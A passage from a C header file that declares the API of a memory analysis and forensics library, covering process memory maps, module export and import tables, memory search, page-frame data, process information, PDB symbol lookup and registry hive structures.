    VMMDLL_MAP_NETENTRY pMap[];     // map entries.
} VMMDLL_MAP_NET, *PVMMDLL_MAP_NET;

typedef struct tdVMMDLL_MAP_PHYSMEM {
    DWORD dwVersion;
    DWORD _Reserved1[5];
    DWORD cMap;                     // # map entries.
    DWORD _Reserved2;
    VMMDLL_MAP_PHYSMEMENTRY pMap[]; // map entries.
} VMMDLL_MAP_PHYSMEM, *PVMMDLL_MAP_PHYSMEM;

typedef struct tdVMMDLL_MAP_USER {
    DWORD dwVersion;
    DWORD _Reserved1[5];
    PBYTE pbMultiText;              // multi-wstr pointed into by VMMDLL_MAP_USERENTRY.wszText
    DWORD cbMultiText;
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_USERENTRY pMap[];    // map entries.
} VMMDLL_MAP_USER, *PVMMDLL_MAP_USER;

typedef struct tdVMMDLL_MAP_SERVICE {
    DWORD dwVersion;
    DWORD _Reserved1[5];
    PBYTE pbMultiText;              // multi-wstr pointed into by VMMDLL_MAP_SERVICEENTRY.wsz*
    DWORD cbMultiText;
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_SERVICEENTRY pMap[]; // map entries.
} VMMDLL_MAP_SERVICE, *PVMMDLL_MAP_SERVICE;

/*
* Retrieve the memory map entries based on hardware page tables (PTE) for the
* process. If pPteMap is set to NULL the number of bytes required will be
* returned in parameter pcbPteMap.
* Entries returned are sorted on VMMDLL_MAP_PTEENTRY.vaBase
* -- dwPID
* -- pPteMap = buffer of minimum byte length *pcbPteMap or NULL.
* -- pcbPteMap = pointer to byte count of pPteMap buffer.
* -- fIdentifyModules = try identify modules as well (= slower)
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetPteU(_In_ DWORD dwPID, _Out_writes_bytes_opt_(*pcbPteMap) PVMMDLL_MAP_PTE pPteMap, _Inout_ PDWORD pcbPteMap, _In_ BOOL fIdentifyModules);
_Success_(return) BOOL VMMDLL_Map_GetPteW(_In_ DWORD dwPID, _Out_writes_bytes_opt_(*pcbPteMap) PVMMDLL_MAP_PTE pPteMap, _Inout_ PDWORD pcbPteMap, _In_ BOOL fIdentifyModules);

/*
* Retrieve memory map entries based on virtual address descriptor (VAD) for
* the process. If pVadMap is set to NULL the number of bytes required
* will be returned in parameter pcbVadMap.
* Entries returned are sorted on VMMDLL_MAP_VADENTRY.vaStart
* -- dwPID
* -- pVadMap = buffer of minimum byte length *pcbVadMap or NULL.
* -- pcbVadMap = pointer to byte count of pVadMap buffer.
* -- fIdentifyModules = try identify modules as well (= slower)
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetVadU(_In_ DWORD dwPID, _Out_writes_bytes_opt_(*pcbVadMap) PVMMDLL_MAP_VAD pVadMap, _Inout_ PDWORD pcbVadMap, _In_ BOOL fIdentifyModules);
_Success_(return) BOOL VMMDLL_Map_GetVadW(_In_ DWORD dwPID, _Out_writes_bytes_opt_(*pcbVadMap) PVMMDLL_MAP_VAD pVadMap, _Inout_ PDWORD pcbVadMap, _In_ BOOL fIdentifyModules);

/*
* Retrieve extended memory map information about a select sub-set of the memory
* map. If pVadExMap is set to NULL the number of bytes required will be
* returned in the parameter pcbVadExMap.
* -- dwPID
* -- pVadExMap = buffer of minimum byte length *pcbVadExMap or NULL.
* -- pcbVadExMap = pointer to byte count of pVadExMap buffer.
* -- oPage = offset in number of pages from process start.
* -- cPage = number of pages to process from oPages base.
* -- return = success/fail.
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_Map_GetVadEx(_In_ DWORD dwPID, _Out_writes_bytes_opt_(*pcbVadExMap) PVMMDLL_MAP_VADEX pVadExMap, _Inout_ PDWORD pcbVadExMap, _In_ DWORD oPage, _In_ DWORD cPage);

/*
* Retrieve the modules (.dlls) for the specified process. If pModuleMap is set
* to NULL the number of bytes required will be returned in parameter pcbModuleMap.
* -- dwPID
* -- pModuleMap = buffer of minimum byte length *pcbModuleMap or NULL.
* -- pcbModuleMap = pointer to byte count of pModuleMap buffer.
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetModuleU(_In_ DWORD dwPID, _Out_writes_bytes_opt_(*pcbModuleMap) PVMMDLL_MAP_MODULE pModuleMap, _Inout_ PDWORD pcbModuleMap);
_Success_(return) BOOL VMMDLL_Map_GetModuleW(_In_ DWORD dwPID, _Out_writes_bytes_opt_(*pcbModuleMap) PVMMDLL_MAP_MODULE pModuleMap, _Inout_ PDWORD pcbModuleMap);

/*
* Retrieve a module (.dll) entry given a process and module name.
* If pModuleMapEntry is set to NULL the number of bytes required
* will be returned in parameter pcbModuleMapEntry.
* If pcbModuleMapEntry is set to NULL the pModuleMapEntry is assumed to be of
* size sizeof(VMMDLL_MAP_MODULEENTRY) and data without names will be copied.
* -- dwPID
* -- [uw]szModuleName = module name (or ""/NULL for 1st module entry).
* -- pModuleMapEntry = buffer of minimum byte length *pcbModuleMapEntry or NULL.
* -- pcbModuleMapEntry = pointer to byte count of pModuleMapEntry buffer or NULL.
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetModuleFromNameU(_In_ DWORD dwPID, _In_opt_ LPSTR  uszModuleName, _Out_writes_bytes_opt_(*pcbModuleMapEntry) PVMMDLL_MAP_MODULEENTRY pModuleMapEntry, _Inout_opt_ PDWORD pcbModuleMapEntry);
_Success_(return) BOOL VMMDLL_Map_GetModuleFromNameW(_In_ DWORD dwPID, _In_opt_ LPWSTR wszModuleName, _Out_writes_bytes_opt_(*pcbModuleMapEntry) PVMMDLL_MAP_MODULEENTRY pModuleMapEntry, _Inout_opt_ PDWORD pcbModuleMapEntry);

/*
* Retrieve the unloaded modules (.dll/.sys) for the specified process. If
* pUnloadedModuleMap is set to NULL the number of bytes required will be
* returned in parameter pcbUnloadedModuleMap.
* -- dwPID
* -- pUnloadedModuleMap = buffer of minimum byte length *pcbUnloadedModuleMap or NULL.
* -- pcbUnloadedModuleMap = pointer to byte count of pUnloadedModuleMap buffer.
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetUnloadedModuleU(_In_ DWORD dwPID, _Out_writes_bytes_opt_(*pcbUnloadedModuleMap) PVMMDLL_MAP_UNLOADEDMODULE pUnloadedModuleMap, _Inout_ PDWORD pcbUnloadedModuleMap);
_Success_(return) BOOL VMMDLL_Map_GetUnloadedModuleW(_In_ DWORD dwPID, _Out_writes_bytes_opt_(*pcbUnloadedModuleMap) PVMMDLL_MAP_UNLOADEDMODULE pUnloadedModuleMap, _Inout_ PDWORD pcbUnloadedModuleMap);

/*
* Retrieve the module exported functions from the export address table (EAT).
* If pEatMap is set to NULL the number of bytes required will be returned in
* parameter pcbEatMap.
* -- dwPID
* -- [uw]szModuleName
* -- pEatMap = buffer of minimum byte length *pcbEatMap or NULL.
* -- pcbEatMap = pointer to byte count of pEatMap buffer.
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetEATU(_In_ DWORD dwPID, _In_ LPSTR  uszModuleName, _Out_writes_bytes_opt_(*pcbEatMap) PVMMDLL_MAP_EAT pEatMap, _Inout_ PDWORD pcbEatMap);
_Success_(return) BOOL VMMDLL_Map_GetEATW(_In_ DWORD dwPID, _In_ LPWSTR wszModuleName, _Out_writes_bytes_opt_(*pcbEatMap) PVMMDLL_MAP_EAT pEatMap, _Inout_ PDWORD pcbEatMap);

/*
* Retrieve the module imported functions from the import address table (IAT).
* If pIatMap is set to NULL the number of bytes required will be returned in
* parameter pcbIatMap.
* -- dwPID
* -- [uw]szModuleName
* -- pIatMap = buffer of minimum byte length *pcbIatMap or NULL.
* -- pcbIatMap = pointer to byte count of pIatMap buffer.
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetIATU(_In_ DWORD dwPID, _In_ LPSTR  uszModuleName, _Out_writes_bytes_opt_(*pcbIatMap) PVMMDLL_MAP_IAT pIatMap, _Inout_ PDWORD pcbIatMap);
_Success_(return) BOOL VMMDLL_Map_GetIATW(_In_ DWORD dwPID, _In_ LPWSTR wszModuleName, _Out_writes_bytes_opt_(*pcbIatMap) PVMMDLL_MAP_IAT pIatMap, _Inout_ PDWORD pcbIatMap);

/*
* Retrieve the heaps for the specified process. If pHeapMap is set to NULL
* the number of bytes required will be returned in parameter pcbHeapMap.
* -- dwPID
* -- pHeapMap = buffer of minimum byte length *pcbHeapMap or NULL.
* -- pcbHeapMap = pointer to byte count of pHeapMap buffer.
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetHeap(_In_ DWORD dwPID, _Out_writes_bytes_opt_(*pcbHeapMap) PVMMDLL_MAP_HEAP pHeapMap, _Inout_ PDWORD pcbHeapMap);

/*
* Retrieve the threads for the specified process. If pThreadMap is set to NULL
* the number of bytes required will be returned in parameter pcbThreadMap.
* Entries returned are sorted on VMMDLL_MAP_THREADENTRY.dwTID
* -- dwPID
* -- pThreadMap = buffer of minimum byte length *pcbThreadMap or NULL.
* -- pcbThreadMap = pointer to byte count of pThreadMap buffer.
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetThread(_In_ DWORD dwPID, _Out_writes_bytes_opt_(*pcbThreadMap) PVMMDLL_MAP_THREAD pThreadMap, _Inout_ PDWORD pcbThreadMap);

/*
* Retrieve the handles for the specified process. If pHandleMap is set to NULL
* the number of bytes required will be returned in parameter pcbHandleMap.
* Entries returned are sorted on VMMDLL_MAP_HANDLEENTRY.dwHandle
* -- dwPID
* -- pHandleMap = buffer of minimum byte length *pcbHandleMap or NULL.
* -- pcbHandleMap = pointer to byte count of pHandleMap buffer.
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetHandleU(_In_ DWORD dwPID, _Out_writes_bytes_opt_(*pcbHandleMap) PVMMDLL_MAP_HANDLE pHandleMap, _Inout_ PDWORD pcbHandleMap);
_Success_(return) BOOL VMMDLL_Map_GetHandleW(_In_ DWORD dwPID, _Out_writes_bytes_opt_(*pcbHandleMap) PVMMDLL_MAP_HANDLE pHandleMap, _Inout_ PDWORD pcbHandleMap);

/*
* Retrieve the physical memory ranges from the physical memory map that Windows
* have enumerated.
* -- pPhysMemMap = buffer of minimum byte length *pcbPhysMemMap or NULL.
* -- pcbPhysMemMap = pointer to byte count of pPhysMemMap buffer.
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetPhysMem(_Out_writes_bytes_opt_(*pcbPhysMemMap) PVMMDLL_MAP_PHYSMEM pPhysMemMap, _Inout_ PDWORD pcbPhysMemMap);

/*
* Retrieve the pool map - consisting of kernel allocated pool entries.
* The pool map pMap is sorted by allocation virtual address.
* The pool map pTag is sorted by pool tag.
* NB! The pool map may contain both false negatives/positives.
* -- pPoolMap = buffer of minimum byte length *pcbPoolMap or NULL.
* -- pcbPoolMap = pointer to byte count of pPoolMap buffer.
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetPool(_Out_writes_bytes_opt_(*pcbPoolMap) PVMMDLL_MAP_POOL pPoolMap, _Inout_ PDWORD pcbPoolMap);

/*
* Retrieve the pool map - consisting of kernel allocated pool entries.
* The pool map pMap is sorted by allocation virtual address.
* The pool map pTag is sorted by pool tag.
* NB! The pool map may contain both false negatives/positives.
* CALLER VMMDLL_MemFree: *ppPoolMap
* -- ppPoolMap = ptr to receive result on success. must be free'd with VMMDLL_MemFree().
* -- flags = VMMDLL_POOLMAP_FLAG*
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetPoolEx(_Out_ PVMMDLL_MAP_POOL* ppPoolMap, _In_ DWORD flags);

/*
* Retrieve the network connection map - consisting of active network connections,
* listening sockets and other networking functionality.
* -- pNetMap = buffer of minimum byte length *pcbNetMap or NULL.
* -- pcbNetMap = pointer to byte count of pNetMap buffer.
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetNetU(_Out_writes_bytes_opt_(*pcbNetMap) PVMMDLL_MAP_NET pNetMap, _Inout_ PDWORD pcbNetMap);
_Success_(return) BOOL VMMDLL_Map_GetNetW(_Out_writes_bytes_opt_(*pcbNetMap) PVMMDLL_MAP_NET pNetMap, _Inout_ PDWORD pcbNetMap);

/*
* Retrieve the non well known users that are detected in the target system.
* NB! There may be more users in the system than the ones that are detected,
* only users with mounted registry hives may currently be detected - this is
* the normal behaviour for users with active processes.
* -- pUserMap = buffer of minimum byte length *pcbUserMap or NULL.
* -- pcbUserMap = pointer to byte count of pUserMap buffer.
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetUsersU(_Out_writes_bytes_opt_(*pcbUserMap) PVMMDLL_MAP_USER pUserMap, _Inout_ PDWORD pcbUserMap);
_Success_(return) BOOL VMMDLL_Map_GetUsersW(_Out_writes_bytes_opt_(*pcbUserMap) PVMMDLL_MAP_USER pUserMap, _Inout_ PDWORD pcbUserMap);

/*
* Retrieve the services currently known by the service control manager (SCM).
* -- pServiceMap = buffer of minimum byte length *pcbServiceMap or NULL.
* -- pcbServiceMap = pointer to byte count of pServiceMap buffer.
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_Map_GetServicesU(_Out_writes_bytes_opt_(*pcbServiceMap) PVMMDLL_MAP_SERVICE pServiceMap, _Inout_ PDWORD pcbServiceMap);
_Success_(return) BOOL VMMDLL_Map_GetServicesW(_Out_writes_bytes_opt_(*pcbServiceMap) PVMMDLL_MAP_SERVICE pServiceMap, _Inout_ PDWORD pcbServiceMap);



//-----------------------------------------------------------------------------
// MEMORY SEARCH FUNCTIONALITY:
//-----------------------------------------------------------------------------

#define VMMDLL_MEM_SEARCH_VERSION           0xfe3e0002
#define VMMDLL_MEM_SEARCH_MAX               16

typedef struct tdVMMDLL_MEM_SEARCH_CONTEXT_SEARCHENTRY {
    DWORD cbAlign;              // byte-align at 2^x - 0, 1, 2, 4, 8, 16, .. bytes.
    DWORD cb;                   // number of bytes to search (1-32).
    BYTE pb[32];
    BYTE pbSkipMask[32];        // skip bitmask '0' = match, '1' = wildcard.
} VMMDLL_MEM_SEARCH_CONTEXT_SEARCHENTRY, *PVMMDLL_MEM_SEARCH_CONTEXT_SEARCHENTRY;

/*
* Context to populate and use in the VMMDLL_MemSearch() function.
*/
typedef struct tdVMMDLL_MEM_SEARCH_CONTEXT {
    DWORD dwVersion;
    DWORD _Filler[2];
    BOOL fAbortRequested;       // may be set by caller to abort processing prematurely.
    DWORD cMaxResult;           // # max result entries. '0' = 1 entry. max 0x10000 entries.
    DWORD cSearch;              // number of valid search entries
    VMMDLL_MEM_SEARCH_CONTEXT_SEARCHENTRY search[VMMDLL_MEM_SEARCH_MAX];
    QWORD vaMin;                // min address to search (page-aligned).
    QWORD vaMax;                // max address to search (page-aligned), if 0 max memory is assumed.
    QWORD vaCurrent;            // current address (may be read by caller).
    DWORD _Filler2;
    DWORD cResult;              // number of search hits.
    QWORD cbReadTotal;          // total number of bytes read.
    PVOID pvUserPtrOpt;         // optional pointer set by caller (used for context passing to callbacks)
    // optional result callback function.
    // use of callback function disable ordinary result in ppObAddressResult.
    // return = continue search(TRUE), abort search(FALSE).
    BOOL(*pfnResultOptCB)(_In_ struct tdVMMDLL_MEM_SEARCH_CONTEXT *ctx, _In_ QWORD va, _In_ DWORD iSearch);
    // non-recommended features:
    QWORD ReadFlags;            // read flags as in VMMDLL_FLAG_*
    BOOL fForcePTE;             // force PTE method for virtual address reads.
    BOOL fForceVAD;             // force VAD method for virtual address reads.
    // optional filter callback function for virtual address reads:
    // for ranges inbetween vaMin:vaMax callback with pte or vad entry.
    // return: read from range(TRUE), do not read from range(FALSE).
    BOOL(*pfnFilterOptCB)(_In_ struct tdVMMDLL_MEM_SEARCH_CONTEXT *ctx, _In_opt_ PVMMDLL_MAP_PTEENTRY pePte, _In_opt_ PVMMDLL_MAP_VADENTRY peVad);
} VMMDLL_MEM_SEARCH_CONTEXT, *PVMMDLL_MEM_SEARCH_CONTEXT;

/*
* Search for binary data in an address space specified by the supplied context.
* For more information about the different search parameters please see the
* struct definition: VMMDLL_MEM_SEARCH_CONTEXT
* Search may take a long time. It's not recommended to run this interactively.
* To cancel a search prematurely set the fAbortRequested flag in the context
* and wait a short while.
* CALLER FREE: VMMDLL_MemFree(*ppva)
* -- dwPID
* -- ctx
* -- ppva = pointer to receive addresses found. Free'd with VMMDLL_MemFree().
* -- pcva = pointer to receive number of addresses in ppva. not bytes!
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_MemSearch(_In_ DWORD dwPID, _Inout_ PVMMDLL_MEM_SEARCH_CONTEXT ctx, _Out_opt_ PQWORD *ppva, _Out_opt_ PDWORD pcva);



//-----------------------------------------------------------------------------
// WINDOWS SPECIFIC PAGE FRAME NUMBER (PFN) FUNCTIONALITY BELOW
//-----------------------------------------------------------------------------

#define VMMDLL_MAP_PFN_VERSION              1

static LPCSTR VMMDLL_PFN_TYPE_TEXT[] = { "Zero", "Free", "Standby", "Modifiy", "ModNoWr", "Bad", "Active", "Transit" };
static LPCSTR VMMDLL_PFN_TYPEEXTENDED_TEXT[] = { "-", "Unused", "ProcPriv", "PageTable", "LargePage", "DriverLock", "Shareable", "File" };

typedef enum tdVMMDLL_MAP_PFN_TYPE {
    VmmDll_PfnTypeZero = 0,
    VmmDll_PfnTypeFree = 1,
    VmmDll_PfnTypeStandby = 2,
    VmmDll_PfnTypeModified = 3,
    VmmDll_PfnTypeModifiedNoWrite = 4,
    VmmDll_PfnTypeBad = 5,
    VmmDll_PfnTypeActive = 6,
    VmmDll_PfnTypeTransition = 7
} VMMDLL_MAP_PFN_TYPE;

typedef enum tdVMMDLL_MAP_PFN_TYPEEXTENDED {
    VmmDll_PfnExType_Unknown = 0,
    VmmDll_PfnExType_Unused = 1,
    VmmDll_PfnExType_ProcessPrivate = 2,
    VmmDll_PfnExType_PageTable = 3,
    VmmDll_PfnExType_LargePage = 4,
    VmmDll_PfnExType_DriverLocked = 5,
    VmmDll_PfnExType_Shareable = 6,
    VmmDll_PfnExType_File = 7,
} VMMDLL_MAP_PFN_TYPEEXTENDED;

typedef struct tdVMMDLL_MAP_PFNENTRY {
    DWORD dwPfn;
    VMMDLL_MAP_PFN_TYPEEXTENDED tpExtended;
    struct {        // Only valid if active non-prototype PFN
        union {
            DWORD dwPid;
            DWORD dwPfnPte[5];  // PFN of paging levels 1-4 (x64)
        };
        QWORD va;               // valid if non-zero
    } AddressInfo;
    QWORD vaPte;
    QWORD OriginalPte;
    union {
        DWORD _u3;
        struct {
            WORD ReferenceCount;
            // MMPFNENTRY
            BYTE PageLocation       : 3;    // Pos 0  - VMMDLL_MAP_PFN_TYPE
            BYTE WriteInProgress    : 1;    // Pos 3
            BYTE Modified           : 1;    // Pos 4
            BYTE ReadInProgress     : 1;    // Pos 5
            BYTE CacheAttribute     : 2;    // Pos 6
            BYTE Priority           : 3;    // Pos 0
            BYTE Rom_OnProtectedStandby : 1;// Pos 3
            BYTE InPageError        : 1;    // Pos 4
            BYTE KernelStack_SystemChargedPage : 1; // Pos 5
            BYTE RemovalRequested   : 1;    // Pos 6
            BYTE ParityError        : 1;    // Pos 7
        };
    };
    union {
        QWORD _u4;
        struct {
            DWORD PteFrame;
            DWORD PteFrameHigh      : 4;    // Pos 32
            DWORD _Reserved         : 21;   // Pos 36
            DWORD PrototypePte      : 1;    // Pos 57
            DWORD PageColor         : 6;    // Pos 58
        };
    };
    DWORD _FutureUse[6];
} VMMDLL_MAP_PFNENTRY, *PVMMDLL_MAP_PFNENTRY;

typedef struct tdVMMDLL_MAP_PFN {
    DWORD dwVersion;
    DWORD _Reserved1[5];
    DWORD cMap;                     // # map entries.
    VMMDLL_MAP_PFNENTRY pMap[];     // map entries.
} VMMDLL_MAP_PFN, *PVMMDLL_MAP_PFN;

/*
* Retrieve information about scattered PFNs. The PFNs are returned in order of
* in which they are stored in the pPfns set.
* -- pPfns
* -- cPfns
* -- pPfnMap = buffer of minimum byte length *pcbPfnMap or NULL.
* -- pcbPfnMap = pointer to byte count of pPhysMemMap buffer.
* -- return = success/fail.
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_Map_GetPfn(_In_ DWORD pPfns[], _In_ DWORD cPfns, _Out_writes_bytes_opt_(*pcbPfnMap) PVMMDLL_MAP_PFN pPfnMap, _Inout_ PDWORD pcbPfnMap);



//-----------------------------------------------------------------------------
// VMM PROCESS FUNCTIONALITY BELOW:
// Functionality below is mostly relating to Windows processes.
//-----------------------------------------------------------------------------

/*
* Retrieve an active process given it's name. Please note that if multiple
* processes with the same name exists only one will be returned. If required to
* parse all processes with the same name please iterate over the PID list by
* calling VMMDLL_PidList together with VMMDLL_ProcessGetInformation.
* -- szProcName = process name case insensitive.
* -- pdwPID = pointer that will receive PID on success.
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_PidGetFromName(_In_ LPSTR szProcName, _Out_ PDWORD pdwPID);

/*
* List the PIDs in the system.
* -- pPIDs = DWORD array of at least number of PIDs in system, or NULL.
* -- pcPIDs = size of (in number of DWORDs) pPIDs array on entry, number of PIDs in system on exit.
* -- return = success/fail.
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_PidList(_Out_writes_opt_(*pcPIDs) PDWORD pPIDs, _Inout_ PULONG64 pcPIDs); 

#define VMMDLL_PROCESS_INFORMATION_MAGIC        0xc0ffee663df9301e
#define VMMDLL_PROCESS_INFORMATION_VERSION      6

typedef struct tdVMMDLL_PROCESS_INFORMATION {
    ULONG64 magic;
    WORD wVersion;
    WORD wSize;
    VMMDLL_MEMORYMODEL_TP tpMemoryModel;    // as given by VMMDLL_MEMORYMODEL_* enum
    VMMDLL_SYSTEM_TP tpSystem;              // as given by VMMDLL_SYSTEM_* enum
    BOOL fUserOnly;                         // only user mode pages listed
    DWORD dwPID;
    DWORD dwPPID;
    DWORD dwState;
    CHAR szName[16];
    CHAR szNameLong[64];
    ULONG64 paDTB;
    ULONG64 paDTB_UserOpt;                  // may not exist
    struct {
        ULONG64 vaEPROCESS;
        ULONG64 vaPEB;
        ULONG64 _Reserved1;
        BOOL fWow64;
        DWORD vaPEB32;                  // WoW64 only
        DWORD dwSessionId;
        ULONG64 qwLUID;
        CHAR szSID[MAX_PATH];
    } win;
} VMMDLL_PROCESS_INFORMATION, *PVMMDLL_PROCESS_INFORMATION;

/*
* Retrieve various process information from a PID. Process information such as
* name, page directory bases and the process state may be retrieved.
* -- dwPID
* -- pProcessInformation = if null, size is given in *pcbProcessInfo
* -- pcbProcessInformation = size of pProcessInfo (in bytes) on entry and exit
* -- return = success/fail.
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_ProcessGetInformation(_In_ DWORD dwPID, _Inout_opt_ PVMMDLL_PROCESS_INFORMATION pProcessInformation, _In_ PSIZE_T pcbProcessInformation);

#define VMMDLL_PROCESS_INFORMATION_OPT_STRING_PATH_KERNEL           1
#define VMMDLL_PROCESS_INFORMATION_OPT_STRING_PATH_USER_IMAGE       2
#define VMMDLL_PROCESS_INFORMATION_OPT_STRING_CMDLINE               3

/*
* Retrieve a string value belonging to a process. The function allocates a new
* string buffer and returns the requested string in it. The string is always
* NULL terminated. On failure NULL is returned.
* NB! CALLER IS RESPONSIBLE FOR VMMDLL_MemFree return value!
* CALLER FREE: VMMDLL_MemFree(return)
* -- dwPID
* -- fOptionString = string value to retrieve as given by VMMDLL_PROCESS_INFORMATION_OPT_STRING_*
* -- return - fail: NULL, success: the string - NB! must be VMMDLL_MemFree'd by caller!
*/
EXPORTED_FUNCTION
LPSTR VMMDLL_ProcessGetInformationString(_In_ DWORD dwPID, _In_ DWORD fOptionString);

/*
* Retrieve information about: Data Directories, Sections, Export Address Table
* and Import Address Table (IAT).
* If the pData == NULL upon entry the number of entries of the pData array must
* have in order to be able to hold the data is returned.
* -- dwPID
* -- [uw]szModule
* -- pData
* -- cData
* -- pcData
* -- return = success/fail.
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_ProcessGetDirectoriesU(_In_ DWORD dwPID, _In_ LPSTR  uszModule, _Out_writes_(16) PIMAGE_DATA_DIRECTORY pData, _In_ DWORD cData, _Out_ PDWORD pcData);
_Success_(return) BOOL VMMDLL_ProcessGetDirectoriesW(_In_ DWORD dwPID, _In_ LPWSTR wszModule, _Out_writes_(16) PIMAGE_DATA_DIRECTORY pData, _In_ DWORD cData, _Out_ PDWORD pcData);
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_ProcessGetSectionsU(_In_ DWORD dwPID, _In_ LPSTR  uszModule, _Out_opt_ PIMAGE_SECTION_HEADER pData, _In_ DWORD cData, _Out_ PDWORD pcData);
_Success_(return) BOOL VMMDLL_ProcessGetSectionsW(_In_ DWORD dwPID, _In_ LPWSTR wszModule, _Out_opt_ PIMAGE_SECTION_HEADER pData, _In_ DWORD cData, _Out_ PDWORD pcData);

/*
* Retrieve the virtual address of a given function inside a process/module.
* -- dwPID
* -- [uw]szModuleName
* -- szFunctionName
* -- return = virtual address of function, zero on fail.
*/
EXPORTED_FUNCTION
ULONG64 VMMDLL_ProcessGetProcAddressU(_In_ DWORD dwPID, _In_ LPSTR  uszModuleName, _In_ LPSTR szFunctionName);
ULONG64 VMMDLL_ProcessGetProcAddressW(_In_ DWORD dwPID, _In_ LPWSTR wszModuleName, _In_ LPSTR szFunctionName);

/*
* Retrieve the base address of a given module.
* -- dwPID
* -- [uw]szModuleName
* -- return = virtual address of module base, zero on fail.
*/
EXPORTED_FUNCTION
ULONG64 VMMDLL_ProcessGetModuleBaseU(_In_ DWORD dwPID, _In_ LPSTR  uszModuleName);
ULONG64 VMMDLL_ProcessGetModuleBaseW(_In_ DWORD dwPID, _In_ LPWSTR wszModuleName);



//-----------------------------------------------------------------------------
// WINDOWS SPECIFIC DEBUGGING / SYMBOL FUNCTIONALITY BELOW:
//-----------------------------------------------------------------------------

/*
* Load a .pdb symbol file and return its associated module name upon success.
* -- dwPID
* -- vaModuleBase
* -- szModuleName = buffer to receive module name upon success.
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_PdbLoad(_In_ DWORD dwPID, _In_ ULONG64 vaModuleBase, _Out_writes_(MAX_PATH) LPSTR szModuleName);

/*
* Retrieve a symbol virtual address given a module name and a symbol name.
* NB! not all modules may exist - initially only module "nt" is available.
* NB! if multiple modules have the same name the 1st to be added will be used.
* -- szModule
* -- cbSymbolAddressOrOffset = symbol virtual address or symbol offset.
* -- szSymbolName = buffer to receive symbol name upon success.
* -- pdwSymbolDisplacement = displacement from the beginning of the symbol.
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_PdbSymbolName(_In_ LPSTR szModule, _In_ QWORD cbSymbolAddressOrOffset, _Out_writes_(MAX_PATH) LPSTR szSymbolName, _Out_opt_ PDWORD pdwSymbolDisplacement);

/*
* Retrieve a symbol virtual address given a module name and a symbol name.
* NB! not all modules may exist - initially only module "nt" is available.
* NB! if multiple modules have the same name the 1st to be added will be used.
* -- szModule
* -- szSymbolName
* -- pvaSymbolAddress
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_PdbSymbolAddress(_In_ LPSTR szModule, _In_ LPSTR szSymbolName, _Out_ PULONG64 pvaSymbolAddress);

/*
* Retrieve a type size given a module name and a type name.
* NB! not all modules may exist - initially only module "nt" is available.
* NB! if multiple modules have the same name the 1st to be added will be used.
* -- szModule
* -- szTypeName
* -- pcbTypeSize
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_PdbTypeSize(_In_ LPSTR szModule, _In_ LPSTR szTypeName, _Out_ PDWORD pcbTypeSize);

/*
* Locate the offset of a type child - typically a sub-item inside a struct.
* NB! not all modules may exist - initially only module "nt" is available.
* NB! if multiple modules have the same name the 1st to be added will be used.
* -- szModule
* -- uszTypeName
* -- uszTypeChildName
* -- pcbTypeChildOffset
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_PdbTypeChildOffset(_In_ LPSTR szModule, _In_ LPSTR uszTypeName, _In_ LPSTR uszTypeChildName, _Out_ PDWORD pcbTypeChildOffset);



//-----------------------------------------------------------------------------
// WINDOWS SPECIFIC REGISTRY FUNCTIONALITY BELOW:
//-----------------------------------------------------------------------------

#define VMMDLL_REGISTRY_HIVE_INFORMATION_MAGIC      0xc0ffee653df8d01e
#define VMMDLL_REGISTRY_HIVE_INFORMATION_VERSION    3

typedef struct td_VMMDLL_REGISTRY_HIVE_INFORMATION {
    ULONG64 magic;
    WORD wVersion;
    WORD wSize;
    BYTE _FutureReserved1[0x14];
    ULONG64 vaCMHIVE;
    ULONG64 vaHBASE_BLOCK;
    DWORD cbLength;
    CHAR uszName[128];
    CHAR uszNameShort[32 + 1];
    CHAR uszHiveRootPath[MAX_PATH];
    QWORD _FutureReserved[0x10];
} VMMDLL_REGISTRY_HIVE_INFORMATION, *PVMMDLL_REGISTRY_HIVE_INFORMATION;

/*
* Retrieve information about the registry hives in the target system.
* -- pHives = buffer of cHives * sizeof(VMMDLL_REGISTRY_HIVE_INFORMATION) to receive information about all hives. NULL to receive # hives in pcHives.
* -- cHives
* -- pcHives = if pHives == NULL: # total hives. if pHives: # read hives.
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
